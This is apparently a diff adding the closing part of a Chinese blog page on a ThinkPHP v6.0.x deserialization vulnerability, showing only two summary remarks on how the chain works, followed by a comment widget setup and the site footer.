+<p>这次反序列化链的终点并不是call_user_func也不是回调函数，而是动态函数的调用</p>
+<p>中间__toString()魔术方法的触发也不是通过函数调用而是对变量（类变量）的拼接</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/grafana-ren-yi-wen-jian-du-qu-lou-dong-fu-xian-fen-xi/" class="post-title gt-a-link">
+                    Grafana 任意文件读取漏洞复现分析
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/thinkphp-v60x-fan-xu-lie-hua-lou-dong-fu-xian-yu-fen-xi/" class="leancloud_visitors" data-flag-title="ThinkPHP v6.0.x反序列化漏洞复现与分析">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
